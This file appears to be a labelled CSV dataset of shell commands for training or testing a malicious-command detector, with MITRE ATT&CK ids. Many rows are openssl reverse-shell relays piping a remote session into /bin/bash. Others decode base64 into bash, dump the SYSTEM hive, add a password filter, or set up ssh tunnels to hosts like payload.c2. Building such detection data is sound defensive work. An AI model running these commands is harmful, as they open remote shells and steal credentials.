command,label,original_label,mitre_id
raw /dev/raw/raw1 /dev/block_device,Benign,Benign,Benign
sudo eopkg install package,Benign,Benign,Benign
sw_vers,Benign,Benign,Benign
openconnect --config=path/to/file vpn.example.org,Benign,Benign,Benign
docker run --name t1069_container --rm -d -t t1069,Context_Dependent,Malicious,T1069
singularity pull --name image.sif library://godlovedc/funny/lolcow:latest,Benign,Benign,Benign
ssh -L 8080:localhost:80 operator@10.0.0.5,Context_Dependent,Synthetic,Synthetic
flite -voice file://path/to/filename.flitevox|url,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:8443 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:8080 operator@corp-backup.internal,Context_Dependent,Synthetic,Synthetic
swc path/to/input_directory --ignore path/to/ignored_file1 path/to/ignored_file2 ...,Benign,Benign,Benign
find . -name ‘*ITM*’,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:5432 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:995 user@172.16.0.10,Context_Dependent,Synthetic,Synthetic
ag [-i|--ignore-case] [-o|--only-matching] STRING,Benign,Benign,Benign
"cd ""PathToAtomicsFolder\ExternalPayloads\""",Malicious,Malicious,T1001
openssl s_client -quiet -connect 10.20.30.40:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9001,Malicious,Synthetic,Synthetic
cat /etc/redis/redis.conf,Benign,Synthetic,Synthetic
sudo lvmdevices --delpvid PVID,Benign,Benign,Benign
ssh -R 4444:localhost:80 support@10.0.0.100,Context_Dependent,Synthetic,Synthetic
0xFF 0xD8,Malicious,Malicious,T1036
column -x -c 30 /tmp/file,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:80,Malicious,Synthetic,Synthetic
keychain --timeout minutes,Benign,Benign,Benign
scan-build command command_arguments,Benign,Benign,Benign
qm start 100,Benign,Benign,Benign
"command | ts ""%b %d %H:%M:%.S""",Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9090,Malicious,Synthetic,Synthetic
find ~ -size +10M,Benign,Benign,Benign
COPY path/to/source_file path/to/destination_file,Benign,Benign,Benign
New-Item -ItemType Directory -Force -Path C:\Users\Public\Libraries\yanki,Malicious,Malicious,T1564
openssl s_client -quiet -connect 172.20.10.8:3389 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:53 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
ippfind --txt-pdl application/postscript [-x|--exec] ipptool -f path/to/document.ps '{}' print-job.test \;,Benign,Benign,Benign
ssh -R 8080:localhost:80 audit@192.168.1.10,Context_Dependent,Synthetic,Synthetic
salt-call state.highstate test=true,Benign,Benign,Benign
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType $command_line_switch_type -EncodedCommandParamVariation $encoded_command_param_variation -UseEncodedArguments -EncodedArgumentsParamVariation $encoded_arguments_param_variation -Execute -ErrorAction Stop,Malicious,Malicious,T1059
ausyscall system_call_number,Benign,Benign,Benign
ssh -R 4444:localhost:80 svcuser@10.0.0.1,Context_Dependent,Synthetic,Synthetic
sslstrip --listen=8080,Benign,Benign,Benign
ip route get 8.8.8.8,Benign,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:993,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:110,Malicious,Synthetic,Synthetic
cargo [b|build] --workspace,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
copy %SystemRoot%\System32\cscript.exe %APPDATA%\notepad.exe /Y,Malicious,Malicious,T1036
ssh -R 4444:localhost:53 postgres@10.0.0.100,Context_Dependent,Synthetic,Synthetic
"cut -d, -f1 file | uniq | xargs -I{} grep -m 1 ""{}"" file",Benign,Benign,Benign
smbclient.py -inputfile path/to/input_file domain/username:password@target,Benign,Benign,Benign
nvidia-smi mig [-lgi|--list-gpu-instances],Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9001,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9090,Malicious,Synthetic,Synthetic
gdm --no-console,Benign,Benign,Benign
find . -size +10k -exec ls -ls {} \+ | sort -n | tail -1,Benign,Benign,Benign
mount -o anon \\computer_name\share_name Z:,Context_Dependent,Benign,Benign
tldr npm owner,Benign,Benign,Benign
opencode mcp logout server_name,Benign,Benign,Benign
echo $fish_encoded | base64 -d | bash,Malicious,Malicious,T1140
(find /boot | sed s'/^/STDOUT:/' ) 3>&1 1>&2 2>&3 | sed 's/^/STDERR:/',Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:110,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8080,Malicious,Synthetic,Synthetic
cjxl [-h -v -v -v -v|--help --verbose --verbose --verbose --verbose],Benign,Benign,Benign
"node [-p|--print] ""process.versions""",Benign,Benign,Benign
"polybar-msg action ""#module_name.action_name.data_string""",Benign,Benign,Benign
ssh -R 8080:localhost:80 admin@10.0.0.25,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:3389 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
Restart-Computer,Malicious,Malicious,T1547
tslint --project path/to/project_root,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:53 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:1433 postgres@10.0.0.5,Context_Dependent,Synthetic,Synthetic
ssh -R 4444:localhost:22 svcuser@10.20.30.40,Context_Dependent,Synthetic,Synthetic
find -print0 | xargs --null,Benign,Benign,Benign
qutebrowser --temp-basedir --json-logging,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
conda package [-r|--reset],Benign,Benign,Benign
k9s --context kubeconfig_context_name,Benign,Benign,Benign
ldc2 -c path/to/source.d,Benign,Benign,Benign
quilt new filename.patch,Benign,Benign,Benign
"julia -e 'print(open(f->read(f, String), ""/path/to/input-file""))'",Context_Dependent,Malicious,T1005
picttoppm [-n|-noheader] [-quic|-quickdraw] path/to/file.pict > path/to/file.ppm,Benign,Benign,Benign
airshare --upload code,Benign,Benign,Benign
c99 -o executable_name file.c,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:143,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:143 root@10.10.10.10,Context_Dependent,Synthetic,Synthetic
ssh -R 4444:localhost:445 user@192.168.1.1,Context_Dependent,Synthetic,Synthetic
ssh -L 8080:localhost:80 deploy@support.internal,Context_Dependent,Synthetic,Synthetic
var FileReader = Java.type('java.io.FileReader');,Context_Dependent,Malicious,T1005
shuf path/to/file,Benign,Benign,Benign
ssh -L 8080:localhost:80 user@192.168.1.254,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:1433 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
"printf """" | ssh-keygen -b 1024 -f ball -t dsa",Benign,Benign,Benign
ssh -L 8080:localhost:8443 admin@payload.c2,Context_Dependent,Synthetic,Synthetic
tag [-r|--remove] tag_name path/to/file,Benign,Benign,Benign
wal-telegram,Benign,Benign,Benign
ssh -L 8080:localhost:80 postgres@ops-audit.internal,Context_Dependent,Synthetic,Synthetic
lid token,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:8888 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
"mktorrent [-c|--comment] ""comment"" [-a|--announce] tracker_announce_url [-l|--piece-length] 21 [-o|--output] path/to/example.torrent path/to/file_or_directory",Benign,Benign,Benign
ssh -R 8080:localhost:80 support@10.0.0.5,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:995,Malicious,Synthetic,Synthetic
"ts-node [-e|--eval] 'console.log(""Hello World"")'",Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:143 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
raku -M module_name path/to/script.raku,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9090,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:3306 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:8443 operator@update.bad,Context_Dependent,Synthetic,Synthetic
idevicecrashreport --keep path/to/directory,Benign,Benign,Benign
ssh -R 8080:localhost:80 support@target.com,Context_Dependent,Synthetic,Synthetic
$AuthenticationPackagesValues += $passwordFilterName,Malicious,Malicious,T1556
openssl s_client -quiet -connect 10.10.10.25:143 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
find . -maxdepth 1 -type d -empty -exec rm {} \;,Benign,Benign,Benign
"bzgrep ""search_pattern"" path/to/file",Benign,Benign,Benign
trans [-d|-dictionary] word,Benign,Benign,Benign
s query,Benign,Benign,Benign
"cd ""$env:PathToAtomicsFolder\T1555.003\bin""",Malicious,Malicious,T1555
scontrol show job job_id,Benign,Benign,Benign
sequelize db:migrate,Benign,Benign,Benign
bioradtopgm path/to/file.pic,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8888,Malicious,Synthetic,Synthetic
"zint --barcode code_type --data ""UTF-8 data"" --output path/to/file",Benign,Benign,Benign
find /home/calvin/ -maxdepth 2 -name “*.txt”,Context_Dependent,Benign,Benign
go get path/to/package,Benign,Benign,Benign
ssh -R 8080:localhost:443 deploy@example.com,Context_Dependent,Synthetic,Synthetic
uv pip list,Benign,Benign,Benign
pro fix CVE-number,Benign,Benign,Benign
ssh -R 4444:localhost:4444 support@assets-dropper.net,Context_Dependent,Synthetic,Synthetic
VBoxManage startvm vm_name|uuid --type headless|gui|sdl|separate,Benign,Benign,Benign
calligrawords path/to/document,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
paccheck,Benign,Benign,Benign
slim,Benign,Benign,Benign
bmon [-R|--rate-interval] 2.0,Benign,Benign,Benign
split -l $MAX_LINES_PER_CHUNK $ORIGINAL_FILE $CHUNK_FILE_PREFIX,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8888,Malicious,Synthetic,Synthetic
django-admin --version,Benign,Benign,Benign
ping host | x ping vis [-m|--heatmap],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:443,Malicious,Synthetic,Synthetic
readpe --exports path/to/executable,Benign,Benign,Benign
"$wc.DownloadFile($url, $imgLocation)",Malicious,Malicious,T1491
monop -r:path/to/assembly.dll [-d|--declared-only] Namespace.Path.To.Type,Benign,Benign,Benign
ssh -L 8080:localhost:80 jenkins@10.0.0.100,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:143,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:1433 user@10.10.10.10,Context_Dependent,Synthetic,Synthetic
sfdk --help,Benign,Benign,Benign
systemctl hibernate --no-wall,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:995 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8443,Malicious,Synthetic,Synthetic
"set-content -path . -stream $ads_filename -value ""test3""",Malicious,Malicious,T1564
tldr echo,Benign,Benign,Benign
uuid -v 4,Benign,Benign,Benign
monolith url [-o|--output] path/to/file.html,Benign,Benign,Benign
xml2man -f path/to/function_file.mxml path/to/function_file.3,Benign,Benign,Benign
fwconsole reload,Benign,Benign,Benign
toilet [-F|--filter] list,Benign,Benign,Benign
gita ll,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:22,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:8080 user@192.168.0.50,Context_Dependent,Synthetic,Synthetic
"echo {1..3} {a..c}{dir1,dir2,dir3}",Benign,Benign,Benign
"fpsync -v -O ""-x|.snapshot*"" /path/to/source/ /path/to/destination/",Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:993,Malicious,Synthetic,Synthetic
find /usr/local -mtime -1,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
sqlx migrate run [-D|--database-url] database_url,Benign,Benign,Benign
at -c job_number,Benign,Benign,Benign
qjoypad --notray,Benign,Benign,Benign
Expand-Archive -Path path\to\example.zip -DestinationPath path\to\extracted_files -WhatIf,Benign,Benign,Benign
ssh -R 4444:localhost:53 operator@internal.corp,Context_Dependent,Synthetic,Synthetic
ssh -R 4444:localhost:22 support@payload.c2,Context_Dependent,Synthetic,Synthetic
/run/shm,Malicious,Malicious,T1027
"find . -name ""my.txt"" 2> find_error.txt",Benign,Benign,Benign
sic -h host -n nickname -k password,Benign,Benign,Benign
"mailx [-s|--subject] ""subject"" [-r|--from-address] from_addr to_addr",Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:3389 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
duckdb -f path/to/script.sql,Benign,Benign,Benign
LOADFIX -32 program,Benign,Benign,Benign
ssh -R 8080:localhost:445 support@192.168.1.100,Context_Dependent,Synthetic,Synthetic
ssh -L 8080:localhost:5432 backup@192.168.1.254,Context_Dependent,Synthetic,Synthetic
find folder -type f -print0 | xargs -0 file --media-type | egrep 'image|video' | cut -f1 -d : | tr '\n' '\0',Benign,Benign,Benign
lorem -s 5 --raven,Benign,Benign,Benign
opencode export,Benign,Benign,Benign
namei [-o|--owners] path/to/a path/to/b path/to/c,Benign,Benign,Benign
gotty [-w|--permit-write] [-c|--credential] username:password shell,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:6379,Malicious,Synthetic,Synthetic
trufflehog git https://github.com/trufflesecurity/test_keys --only-verified,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:53,Malicious,Synthetic,Synthetic
"grep ""# THIS IS A COMMENT"" /etc/ufw/ufw.conf",Malicious,Malicious,T1562
ssh -R 4444:localhost:22 backup@10.10.10.10,Context_Dependent,Synthetic,Synthetic
"find . -name ""*.txt"" | parallel -j1 --tty vim",Benign,Benign,Benign
ssh -R 8080:localhost:995 user@192.168.1.100,Context_Dependent,Synthetic,Synthetic
killall 'Google Chrome',Malicious,Malicious,T1539
find . -name *.cpp -o -name *.h -o -name *.java,Benign,Benign,Benign
ranger --profile,Benign,Benign,Benign
slurmctld -n value,Benign,Benign,Benign
age [-p|--passphrase] [-o|--output] path/to/encrypted_file.age path/to/unencrypted_file,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:110 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
sudo phpdismod json,Benign,Benign,Benign
ls ~username,Benign,Benign,Benign
pbmtoepson [-d|-dpi] 60|72|80|90|120|144|240 path/to/image.pbm > path/to/output.epson,Benign,Benign,Benign
gzip -k *cache.html,Benign,Benign,Benign
tail -n 100 file1 | pv | wc -l,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:3306 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
m4b-tool merge path/to/input_directory [-o|--output-file]=path/to/merged.m4b,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:443 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
iperf [-c|--client] server_address,Benign,Benign,Benign
last [-F|--fulltimes] [-a|--hostlast],Context_Dependent,Benign,Benign
ssh -L 8080:localhost:80 postgres@172.20.10.8,Context_Dependent,Synthetic,Synthetic
railway run cmd,Benign,Benign,Benign
dirs,Benign,Benign,Benign
find . -mtime -5,Benign,Benign,Benign
"find . -name *.xml | xargs grep -P ""[\x80-\xFF]""",Benign,Benign,Benign
balooctl [-h|--help],Benign,Benign,Benign
ssh -R 4444:localhost:22 user@192.168.1.10,Context_Dependent,Synthetic,Synthetic
"New-Item -ItemType Key -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer""",Malicious,Malicious,T1547
openssl s_client -quiet -connect 172.16.5.20:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:143,Malicious,Synthetic,Synthetic
nice [-n|--adjustment] niceness_value command,Benign,Benign,Benign
ssh -R 8080:localhost:9001 operator@172.20.10.8,Context_Dependent,Synthetic,Synthetic
nagios3 -s,Benign,Benign,Benign
gbp buildpackage -jauto -us -uc --changes-options=-S,Benign,Benign,Benign
wifi-menu [-h|--help],Benign,Benign,Benign
"[ ""$(uname)"" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art",Malicious,Malicious,T1059
openssl s_client -quiet -connect 10.10.10.25:110 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
iostat 2,Benign,Benign,Benign
/tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337,Malicious,Malicious,T1539
openssl s_client -quiet -connect 192.168.0.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8080,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:5432,Malicious,Synthetic,Synthetic
sudo pacman -Syu --overwrite path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:1433 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
gdal_translate -outsize 40% 40% path/to/input.tif path/to/output.tif,Benign,Benign,Benign
informant [-h|--help],Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
kubectl drain node_name --ignore-daemonsets,Benign,Benign,Benign
ssh -L 8080:localhost:6379 root@10.10.10.10,Context_Dependent,Synthetic,Synthetic
"ln -s ""$source"" -t ~/newlinks",Benign,Benign,Benign
avrdude -p part_no -c programmer_id -U flash:r:file.hex:i,Benign,Benign,Benign
combine path/to/file1 and path/to/file2,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8888,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9001,Malicious,Synthetic,Synthetic
beep -f 262 [-n|--new] -f 294 [-n|--new] -f 330 [-n|--new] -f 349 [-n|--new] -f 392 [-n|--new] -f 440 [-n|--new] -f 494 [-n|--new] -f 523,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:143,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:443,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8080,Malicious,Synthetic,Synthetic
cbonsai [-L|--life] 0..200,Benign,Benign,Benign
try { $myT1036_003 = (Start-Process -PassThru -FilePath $outputfile).Id },Malicious,Malicious,T1036
pbmtoepsi [-d|-dpi] 72x144 path/to/image.pbm > path/to/output.bmp,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:8081,Malicious,Synthetic,Synthetic
jstack -m java_pid,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8080,Malicious,Synthetic,Synthetic
yara [-s|--print-strings] path/to/rule.yar path/to/file,Benign,Benign,Benign
echo Password!>> passwords.txt,Malicious,Malicious,T1110
bun [a|add] [-d|--dev] package,Benign,Benign,Benign
distrobox-export [-b|--bin] path/to/binary [-ep|--export-path] path/to/binary_on_host,Benign,Benign,Benign
btrfs [v|version],Benign,Benign,Benign
"sudo nmap -T0 -D decoy_ip1,decoy_ip2,... --source-port 53 -f --data-length 16 -Pn ip_or_host",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:110,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:443 user@172.16.5.20,Context_Dependent,Synthetic,Synthetic
Invoke-ATHHTMLApplication -HTAFilePath $hta_file_path -ScriptEngine $script_engine -SimulateUserDoubleClick,Malicious,Malicious,T1218
"& ""$pua_file""",Malicious,Malicious,T1204
"find /home -type f -name ""*.ext"" -exec sed -i -e ""s/\x0D$//g"" {} \;",Context_Dependent,Benign,Benign
ssh -fN -L 8080:10.0.0.100:110 svcuser@172.20.10.8,Context_Dependent,Synthetic,Synthetic
qmake -o path/to/Makefile path/to/project_file.pro,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8443,Malicious,Synthetic,Synthetic
tldr [-p|--platform] linux logger,Benign,Benign,Benign
slapt-src [-w|--show] slackbuild_name,Benign,Benign,Benign
locale date_fmt,Benign,Benign,Benign
assimp export input_file.stl output_file.obj,Benign,Benign,Benign
aws cur put-report-definition --report-definition file://path/to/report_definition.json,Benign,Benign,Benign
ssh -R 8080:localhost:4444 audit@staging.lab,Context_Dependent,Synthetic,Synthetic
rustc --target target_triple path/to/main.rs,Benign,Benign,Benign
tcpreplay [-i|--intf1] eth0 [-l|--loop] num_times traffic.pcap,Benign,Benign,Benign
pct config 100 --current,Benign,Benign,Benign
ssh -R 4444:localhost:995 audit@malware.site,Context_Dependent,Synthetic,Synthetic
finger $username | awk '/^Directory/ {print $2}',Context_Dependent,Benign,Benign
reg save HKLM\SYSTEM $extract_path\SYSTEM_HIVE,Malicious,Malicious,T1003
history | vim -,Context_Dependent,Benign,Benign
xattr,Malicious,Malicious,T1564
shopt -s extglob find !(D) -name hi.dat,Benign,Benign,Benign
"kubetail app_name_1,app_name_2,...",Benign,Benign,Benign
ssh -R 4444:localhost:110 user@192.168.0.50,Context_Dependent,Synthetic,Synthetic
Add-Type -AssemblyName System.Windows.Forms,Malicious,Malicious,T1113
pw-dot [-r|--remote] remote_name [-s|--smart],Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4444,Malicious,Synthetic,Synthetic
robocopy path\to\source_directory path\to\destination_directory *.jpg *.bmp,Benign,Benign,Benign
tectonic -X init,Benign,Benign,Benign
clip-view --render tldr|tldr-colorful|docopt|docopt-colorful page_name1 page_name2 ...,Benign,Benign,Benign
ssh -R 8080:localhost:80 user@192.168.0.50,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:22 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
"Get-Item -Path ""HKCU:Software\Microsoft\Windows\CurrentVersion\RunServices""",Context_Dependent,Malicious,T1012
openssl s_client -quiet -connect 10.10.10.25:3306 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
chronic command option1 option2 ...,Benign,Benign,Benign
ndctl destroy-namespace --force namespaceX.Y,Benign,Benign,Benign
"whence -c ""command""",Benign,Benign,Benign
ssh -R 8080:localhost:80 support@172.16.0.25,Context_Dependent,Synthetic,Synthetic
standard-version,Benign,Benign,Benign
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" $optional_args -sc dclist",Context_Dependent,Malicious,T1018
find ~/Library -name '* *' -print0 | xargs -0 tar rf blah.tar,Benign,Benign,Benign
sudo kismet -c wlan0 --info BSSID,Benign,Benign,Benign
find . -type f -name filename.txt -exec vi {} +,Benign,Benign,Benign
pulumi refresh --expect-no-changes,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9090 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
"find tmp -type f -printf ""f %s %p\n""",Benign,Benign,Benign
cbt ls,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:445,Malicious,Synthetic,Synthetic
makoctl mode -t do-not-disturb,Benign,Benign,Benign
"alias | awk '/^alias /{print substr($2,1,index($2,""="")-1)}'",Benign,Benign,Benign
ssh -L 8080:localhost:993 support@internal.corp,Context_Dependent,Synthetic,Synthetic
dotnet run,Benign,Benign,Benign
find /path/to/dir ! -perm 644,Benign,Benign,Benign
find . -type f -name '*.html',Benign,Benign,Benign
rlwrap [-A|--ansi-colour-aware] command,Benign,Benign,Benign
kill -9 `pgrep -f cps_build`,Benign,Benign,Benign
"dirsearch [-l|--url-list] path/to/url-list.txt [-e|--extensions] php,jsp,aspx,...",Benign,Benign,Benign
New-Item -ItemType SymbolicLink|HardLink|Junction -Path path\to\link_file -Target path\to\source_file_or_directory,Benign,Benign,Benign
getent group | cut -d: -f1 | sort | cat -n,Context_Dependent,Benign,Benign
ssh -R 4444:localhost:1433 user@10.0.0.25,Context_Dependent,Synthetic,Synthetic
ssh -R 8080:localhost:80 support@192.168.1.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:3389,Malicious,Synthetic,Synthetic
